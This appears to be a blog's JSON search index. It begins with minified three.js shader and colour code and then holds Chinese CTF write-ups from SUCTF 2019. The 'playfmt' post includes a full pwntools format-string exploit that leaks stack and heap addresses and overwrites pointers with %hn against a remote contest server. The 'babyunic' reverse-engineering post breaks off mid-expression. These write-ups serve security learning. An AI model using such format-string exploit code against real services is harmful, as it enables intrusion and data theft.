DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include \\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include \\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshlambert_vert:\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshphong_frag:\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include \\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshphong_vert:\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshphysical_frag:\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshphysical_vert:\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", normal_frag:\"#define NORMAL\\nuniform float opacity;\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || ( defined( USE_NORMALMAP ) && ! defined( OBJECTSPACE_NORMALMAP ) )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\\n}\\n\", normal_vert:\"#define NORMAL\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || ( defined( USE_NORMALMAP ) && ! defined( OBJECTSPACE_NORMALMAP ) )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || ( defined( USE_NORMALMAP ) && ! defined( OBJECTSPACE_NORMALMAP ) )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n}\\n\", points_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", points_vert:\"uniform float size;\\nuniform float scale;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = size;\\n\\t#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", shadow_frag:\"uniform vec3 color;\\nuniform float opacity;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\\n\\t#include \\n}\\n\",shadow_vert:\"#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", sprite_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", sprite_vert:\"uniform float rotation;\\nuniform vec2 center;\\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec2 scale;\\n\\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\\n\\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\\n\\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\\n\\tvec2 rotatedPosition;\\n\\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\\n\\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\\n\\tvec4 mvPosition;\\n\\tmvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\\n\\tmvPosition.xy += rotatedPosition;\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\"}, Aa={merge:function(a){for(var b={},c=0;c>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r= Math.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)%\\s*,\\s*(\\d+)%\\s*,\\s*(\\d+)%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)%\\s*,\\s*(\\d+)%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){d=parseFloat(c[1])/ 360;var e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0a?.0773993808*a:Math.pow(.9478672986*a+.0521327014,2.4)}return function(b){this.r=a(b.r);this.g=a(b.g);this.b=a(b.b);return this}}(),copyLinearToSRGB:function(){function a(a){return.0031308>a?12.92*a:1.055*Math.pow(a,.41666)-.055}return function(b){this.r=a(b.r);this.g=a(b.g);this.b=a(b.b);return this}}(),convertSRGBToLinear:function(){this.copySRGBToLinear(this); return this},convertLinearToSRGB:function(){this.copyLinearToSRGB(this);return this},getHex:function(){return 255*this.rMath.abs(f)?(this._x=Math.atan2(n,k),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-m,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a=new I;return function(b,c,d){a.makeRotationFromQuaternion(b); return this.setFromRotationMatrix(a,c,d)}}(),setFromVector3:function(a,b){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new fa;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]); void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new p(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}});Object.assign(Rd.prototype,{set:function(a){this.mask=1"}],"posts":[{"title":"SUCTF2019-playfmt","slug":"SUCTF2019-playfmt","date":"2019-08-19T13:00:00.000Z","updated":"2019-08-18T13:14:08.118Z","comments":true,"path":"2019/08/19/SUCTF2019-playfmt/","link":"","permalink":"http://yoursite.com/2019/08/19/SUCTF2019-playfmt/","excerpt":"在BSS段上的格式化字符串","text":"在BSS段上的格式化字符串 ida分析就不贴了，很简单的格式化字符串，只是printf(buf)中的buf存在bss段上，因此读写没有那么方便。 尝试只读写栈中的内容来获取flag。 可以发现程序读取flag存到了堆里，并且在栈中可以发现指向堆区的指针。利用格式化字符串leak出堆地址以及栈地址。 同时在栈区可以发现如下的结构: 10xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc38 ◂— 0x0 0xff97fbec —▸ 0x80488f0 (logo()+67) ◂— call 0x804884b 0e:0038│ 0xff97fbf0 —▸ 0xf7608000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ... ↓ 0xff97fbf8 —▸ 0xff97fc38 ◂— 0x0 0xff97fbfc —▸ 0x8048ac4 (main+440) ◂— call 0x804884b 0xff97fc00 —▸ 0xf7608d60 (_IO_2_1_stdout_) ◂— 0xfbad2887 0xff97fc04 ◂— 0x0 0xff97fc08 —▸ 0xff97fc38 ◂— 0x0 0xff97fc0c —▸ 0x8048ac4 (main+440) ◂— call 0x804884b 0xff97fc10 —▸ 0xf76083dc (__exit_funcs) —▸ 0xf76091e0 (initial) ◂— 0x0 0xff97fc14 ◂— 0x0 0xff97fc18 —▸ 0x9d8fa28 —▸ 0xf76087b0 (main_arena+48) —▸ 0x9d8fe60 ◂— 0x0 0xff97fc1c —▸ 0x9d8fe30 ◂— 0x0 其中 0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc38 ◂— 0x0 通过%n改写此处，使其成为 0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa28(heap)， 然后此时 0xff97fc08 —▸ 0xff97fc38 ◂— 0x0 变为 0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa28(heap) 再改写此处，使得其成为 0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa10(flag) 之后 0xff97fc18 —▸ 0x9d8fa10(flag) %s读取此处就可以得到flag。 但是由于堆区地址只有后三位是固定的，每次都写入0x0a10，这样就有1/16的概率可以读取到flag。 1#!/usr/bin/env python from pwn import * from LibcSearcher import * sh=remote(&quot;120.78.192.35&quot;,9999) #sh=process(&quot;./playfmt&quot;) sh.recvuntil(&quot;=====================\\n&quot;) sh.recvuntil(&quot;=====================\\n&quot;) sh.sendline(&quot;%6$p&quot;) stack=int(sh.recv(),16)-0xf8+0xc0 log.success(&quot;stack: &quot;+hex(stack)) #sh.sendline(&quot;%12$p&quot;) #IOstdout=int(sh.recv(),16) #libcbase=IOstdout-(0xf75f0d60-0xf743e000) #log.success(&quot;libcbase: &quot;+hex(libcbase)) sh.sendline(&quot;%18$p&quot;) flagaddr=int(sh.recv(),16)-0x20+8 log.success(&quot;flagaddr: &quot;+hex(flagaddr)) ffff=(stack+18*4)&amp;0xffff sh.sendline(&quot;%&quot;+str(ffff)+&quot;c%6$hn&quot;) sh.recvuntil(&apos;\\xac\\n&apos;) sh.sendline(&quot;%2576c%14$hn&quot;) if flagaddr&amp;0xffff==0xa10: sh.sendline(&quot;%18$s&quot;) sh.recvuntil(&apos;\\xac\\n&apos;) flag=sh.recv() log.success(&quot;flag: &quot;+flag) sh.close()","categories":[],"tags":[]},{"title":"SUCTF2019-babyunic","slug":"SUCTF2019-babyunic","date":"2019-08-19T13:00:00.000Z","updated":"2019-08-21T06:01:11.080Z","comments":true,"path":"2019/08/19/SUCTF2019-babyunic/","link":"","permalink":"http://yoursite.com/2019/08/19/SUCTF2019-babyunic/","excerpt":"yxtql","text":"yxtql main函数： 123456789101112131415161718if ( a1 == 2 )&#123; puts(&quot;SUCTF 2019&quot;); printf(&quot;input your flag:&quot;, a2); s1 = malloc(0x200uLL); v4 = malloc(0x200uLL); __isoc99_scanf(&quot;%50s&quot;, v4); sub_CBA(v4, s1, *(_QWORD *)(v5 + 8)); if ( !memcmp(s1, &amp;unk_202020, 0xA8uLL) ) puts(&quot;congratuation!&quot;); else puts(&quot;fail!&quot;);&#125;else&#123; puts(&quot;no input files&quot;);&#125;return 0LL; 看上去很简单，跟进关键函数subCBA: 123456789101112131415161718192021stream = fopen(&quot;./func&quot;, &quot;rb&quot;);ptr = malloc(0x7100uLL);fread(ptr, 1uLL, 0x7100uLL, stream);v5 = 0x101FFFC0;v6 = 0x101FFFC0;v7 = 0x101FFB00;v8 = 0x101FFA00;uc_open(3LL, 0x40000004LL, &amp;v9);uc_mem_map(v9, 0x400000LL, 0x200000LL, 7LL);uc_mem_map(v9, 0x10000000LL, 0x200000LL, 7LL);v3 = strlen(a1);uc_mem_write(v9, 0x101FFB00LL, a1, v3);uc_mem_write(v9, 0x400000LL, ptr, 28928LL);uc_reg_write(v9, 31LL, &amp;v5);uc_reg_write(v9, 32LL, &amp;v6);uc_reg_write(v9, 7LL, &amp;v8);uc_reg_write(v9, 6LL, &amp;v7);uc_emu_start(v9, 0x400000LL, 4223084LL, 0LL, 0LL);uc_mem_read(v9, 0x101FFA00LL, a2, 200LL);uc_close(v9);return fclose(stream) 完全看不懂，但是通过万能的google了解到这是unicorn。分配了虚拟内存，并在其中模拟代码的执行，最后读取0x101ffa00的内存来与main函数中的输入作比较。 其中uc_open(3LL, 0x40000004LL, &amp;v9)代表使用UC_ARCH_MIPS和UC_MODE_32，特别的是0x40000004LL，0x4代表了UC_MODE_32，而0x40000000代表了大端序，所以可以判断func使用的是大端序的MIPS32。 func: 1234567891011121314151617181920unsigned int sub_0(unsigned int param0, unsigned int param1) &#123; unsigned int v0 = param0, v1 = param1; int i; for(i = 0; *(i + v0) != 0; ++i) &#123; &#125; for(int j = 0; j &lt; i; ++j) &#123; unsigned char v2 = *(j + v0); unsigned int v3 = ((unsigned int)v2) * &amp;loc_8; v3 = ((unsigned int)(((unsigned char)(((unsigned int)v2) &gt;&gt;&gt; 5)))) | ((int)(((unsigned char)v3))); *(j + v0) = (unsigned char)(((int)(((unsigned char)v3))) ^ ((int)(((unsigned char)j)))); &#125; *v1 = ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) + ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 3))) + ((unsigned int)(*(v0 + &amp;loc_4))) - ((unsigned int)(*(v0 + 5))) - ((unsigned int)(*(v0 + 6))) - ((unsigned int)(*(v0 + 7))) - ((unsigned int)(*(v0 + &amp;loc_8))) + ((unsigned int)(*(v0 + 9))) + ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) - ((unsigned int)(*(v0 + 14))) + ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) - ((unsigned int)(*(v0 + 17))) + ((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19))) - ((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21))) + (((unsigned int)(*(v0 + 22))) + ((unsigned int)(*(v0 + 23)))) + ((unsigned int)(*(v0 + &amp;loc_18))) - ((unsigned int)(*(v0 + 25))) + ((unsigned int)(*(v0 + 26))) - ((unsigned int)(*(v0 + 27))) + ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) - ((unsigned int)(*(v0 + 30))) - ((unsigned int)(*(v0 + 31))) + ((unsigned int)(*(v0 + &amp;loc_20))) - ((unsigned int)(*(v0 + 33))) + ((unsigned int)(*(v0 + 34))) + ((unsigned int)(*(v0 + 35))) - ((unsigned int)(*(v0 + &amp;loc_24))) - ((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41))); *(v1 + &amp;loc_4) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) - ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) + ((unsigned int)(*(v0 + 5))) - ((unsigned int)(*(v0 + 6))) - ((unsigned int)(*(v0 + 7))) - ((unsigned int)(*(v0 + &amp;loc_8))) - ((unsigned int)(*(v0 + 9))) + ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) - ((unsigned int)(*(v0 + 14))) + ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) - ((unsigned int)(*(v0 + 17))) + ((unsigned int)(*(v0 + 18))) - ((unsigned int)(*(v0 + 19))) + ((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21))) - ((unsigned int)(*(v0 + 22))) - ((unsigned int)(*(v0 + 23))) - ((unsigned int)(*(v0 + &amp;loc_18))) + ((unsigned int)(*(v0 + 25))) - ((unsigned int)(*(v0 + 26))) + ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) - ((unsigned int)(*(v0 + 29))) + ((unsigned int)(*(v0 + 30))) + (((unsigned int)(*(v0 + 31))) + ((unsigned int)(*(v0 + &amp;loc_20)))) + (((unsigned int)(*(v0 + 33))) + ((unsigned int)(*(v0 + 34))) + ((unsigned int)(*(v0 + 35)))) - ((unsigned int)(*(v0 + &amp;loc_24))) - ((unsigned int)(*(v0 + 37))) - ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) - ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41))); *(v1 + &amp;loc_8) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) + ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) + ((unsigned int)(*(v0 + 5))) - ((unsigned int)(*(v0 + 6))) - ((unsigned int)(*(v0 + 7))) + ((unsigned int)(*(v0 + &amp;loc_8))) - ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) - ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) + ((unsigned int)(*(v0 + 14))) - ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) + ((unsigned int)(*(v0 + 17))) + (((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19)))) + (((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21)))) - ((unsigned int)(*(v0 + 22))) + ((unsigned int)(*(v0 + 23))) + (((unsigned int)(*(v0 + &amp;loc_18))) + ((unsigned int)(*(v0 + 25)))) + ((unsigned int)(*(v0 + 26))) - ((unsigned int)(*(v0 + 27))) + ((unsigned int)(*(v0 + &amp;loc_1C))) - ((unsigned int)(*(v0 + 29))) + ((unsigned int)(*(v0 + 30))) - ((unsigned int)(*(v0 + 31))) + ((unsigned int)(*(v0 + &amp;loc_20))) + ((unsigned int)(*(v0 + 33))) - ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) + ((unsigned int)(*(v0 + &amp;loc_24))) + (((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38)))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) - ((unsigned int)(*(v0 + 41))); *(v1 + &amp;loc_C) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) - ((unsigned int)(*(v0 + 2))) - ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) - ((unsigned int)(*(v0 + 5))) + ((unsigned int)(*(v0 + 6))) + ((unsigned int)(*(v0 + 7))) - ((unsigned int)(*(v0 + &amp;loc_8))) - ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) + ((unsigned int)(*(v0 + 14))) - ((unsigned int)(*(v0 + 15))) + ((unsigned int)(*(v0 + &amp;loc_10))) - ((unsigned int)(*(v0 + 17))) + ((unsigned int)(*(v0 + 18))) + (((unsigned int)(*(v0 + 19))) + ((unsigned int)(*(v0 + &amp;loc_14)))) - ((unsigned int)(*(v0 + 21))) + ((unsigned int)(*(v0 + 22))) + (((unsigned int)(*(v0 + 23))) + ((unsigned int)(*(v0 + &amp;loc_18)))) - ((unsigned int)(*(v0 + 25))) - ((unsigned int)(*(v0 + 26))) + ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) + ((unsigned int)(*(v0 + 30))) - ((unsigned int)(*(v0 + 31))) - ((unsigned int)(*(v0 + &amp;loc_20))) - ((unsigned int)(*(v0 + 33))) + ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) + ((unsigned int)(*(v0 + &amp;loc_24))) + (((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38)))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41))); *(v1 + &amp;loc_10) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) - ((unsigned int)(*(v0 + 2))) + ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) - ((unsigned int)(*(v0 + 5))) + ((unsigned int)(*(v0 + 6))) + (((unsigned int)(*(v0 + 7))) + ((unsigned int)(*(v0 + &amp;loc_8)))) + ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) + ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) + ((unsigned int)(*(v0 + 14))) - ((unsigned int)(*(v0 + 15))) + ((unsigned int)(*(v0 + &amp;loc_10))) + ((unsigned int)(*(v0 + 17))) - ((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19))) - ((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21))) - ((unsigned int)(*(v0 + 22))) - ((unsigned int)(*(v0 + 23))) - ((unsigned int)(*(v0 + &amp;loc_18))) + ((unsigned int)(*(v0 + 25))) - ((unsigned int)(*(v0 + 26))) - ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) + (((unsigned int)(*(v0 + 30))) + ((unsigned int)(*(v0 + 31)))) - ((unsigned int)(*(v0 + &amp;loc_20))) + ((unsigned int)(*(v0 + 33))) - ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) + ((unsigned int)(*(v0 + &amp;loc_24))) - ((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) - ((unsigned int)(*(v0 + &amp;loc_28))) - ((unsigned int)(*(v0 + 41))); *(v1 + &amp;loc_14) = ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) + (((unsigned int)(*(v0 + 3))) + ((unsigned int)(*(v0 + &amp;loc_4)))) + (((unsigned int)(*(v0 + 5))) + ((unsigned int)(*(v0 + 6))) + (((unsigned int)(*(v0 + 7))) + ((unsigned int)(*(v0 + &amp;loc_8))))) + ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) - ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) - ((unsigned int)(*(v0 + 14))) + ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) + ((unsigned int)(*(v0 + 17))) - ((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19))) + ((unsigned int)(*(v0 + &amp;loc_14))) - ((unsigned 